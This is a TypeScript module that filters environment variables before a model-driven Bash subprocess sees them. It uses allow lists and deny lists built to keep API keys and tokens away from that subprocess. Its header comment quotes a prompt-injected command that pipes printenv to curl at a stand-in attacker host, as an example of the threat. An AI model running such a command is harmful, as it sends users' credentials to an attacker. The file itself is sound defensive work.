// Env scrubbing for Bash subprocess.
//
// Threat: process.env contains every secret in the user's shell — provider
// API keys (ANTHROPIC_API_KEY, GH_TOKEN, AWS_*), CI tokens, npm publish
// tokens. Passing it untouched to a model-driven Bash means a single
// prompt-injected `printenv | curl -d @- evil.com` exfiltrates everything.
//
// Policy: deny-by-default. Subprocess only sees vars whose name is on the
// allowlist (exact name) or whose name starts with an allowed prefix.
// Users can extend either list (add their own allowed names/prefixes) or
// override (deny names/prefixes that are otherwise allowed by default).
// Deny rules win over allow rules so a user-added deny is always honored.

export interface EnvPolicy {
  allow?: string[];
  allowPrefixes?: string[];
  deny?: string[];
  denyPrefixes?: string[];
}

// Exact-match var names that are safe to forward.
//
// Notes on borderline cases:
//   SSH_AUTH_SOCK — needed for `git push` over ssh. The socket itself is the
//     credential channel; an attacker who can run subprocesses can sign with
//     it whether or not we forward this var (they'd just point ssh at it via
//     the well-known path). Forwarding doesn't materially worsen the threat.
//   EDITOR/VISUAL/PAGER — git, npm, bundler invoke these. Without them,
//     interactive subcommands break. The values are just program names.
//   NODE_ENV/NODE_PATH — sometimes load-bearing for npm scripts. NODE_OPTIONS
//     is intentionally NOT here because it can inject `--require` modules.
const DEFAULT_ALLOW: readonly string[] = [
  'PATH', 'HOME', 'USER', 'LOGNAME', 'SHELL',
  'TERM', 'COLORTERM',
  'LANG', 'LANGUAGE', 'TZ',
  'PWD', 'OLDPWD', 'TMPDIR', 'TMP', 'TEMP',
  'EDITOR', 'VISUAL', 'PAGER',
  'DISPLAY',
  'SSH_AUTH_SOCK', 'SSH_CONNECTION', 'SSH_CLIENT', 'SSH_TTY',
  'NODE_ENV', 'NODE_PATH',
];

// Prefix-match patterns. Matches at the start of the var name; for example
// 'GIT_' matches 'GIT_AUTHOR_NAME' but not 'MYGIT_FOO'.
const DEFAULT_ALLOW_PREFIXES: readonly string[] = [
  'LC_',     // locale: LC_ALL, LC_CTYPE, …
  'GIT_',    // git's many knobs (GIT_AUTHOR_NAME, GIT_DIR, …)
  'XDG_',    // XDG base dir spec
];

// Built-in deny that wins over any allow. These are vars whose names look
// allow-shaped (e.g. start with GIT_) but smuggle credentials. Adding to
// this list is preferable to removing the corresponding prefix from the
// allow list, which would break unrelated benign vars.
const DEFAULT_DENY: readonly string[] = [
  'GIT_ASKPASS',           // can be set to a credential helper script path
  'GIT_SSH_COMMAND',       // can override which ssh binary runs
  'GIT_HTTP_USER_AGENT',   // some setups stuff tokens here
  'XDG_RUNTIME_DIR',       // path to user's runtime dir; not a secret but
                           //   lets subprocesses target ephemeral sockets
];

const DEFAULT_DENY_PREFIXES: readonly string[] = [
  'FACTORY_',  // our own debug/state vars — no reason to expose
];

interface SanitizedEnv {
  env: NodeJS.ProcessEnv;
  /** Names of vars that were dropped. Kept short — names only, no values. */
  dropped: string[];
}

export function sanitizeEnv(
  source: NodeJS.ProcessEnv,
  policy: EnvPolicy = {},
): SanitizedEnv {
  const allow = new Set([...DEFAULT_ALLOW, ...(policy.allow ?? [])]);
  const allowPrefixes = [...DEFAULT_ALLOW_PREFIXES, ...(policy.allowPrefixes ?? [])];
  const deny = new Set([...DEFAULT_DENY, ...(policy.deny ?? [])]);
  const denyPrefixes = [...DEFAULT_DENY_PREFIXES, ...(policy.denyPrefixes ?? [])];

  const env: NodeJS.ProcessEnv = {};
  const dropped: string[] = [];

  for (const [name, value] of Object.entries(source)) {
    if (value === undefined) continue;
    if (deny.has(name) || denyPrefixes.some(p => name.startsWith(p))) {
      dropped.push(name);
      continue;
    }
    if (allow.has(name) || allowPrefixes.some(p => name.startsWith(p))) {
      env[name] = value;
      continue;
    }
    dropped.push(name);
  }

  return { env, dropped };
}
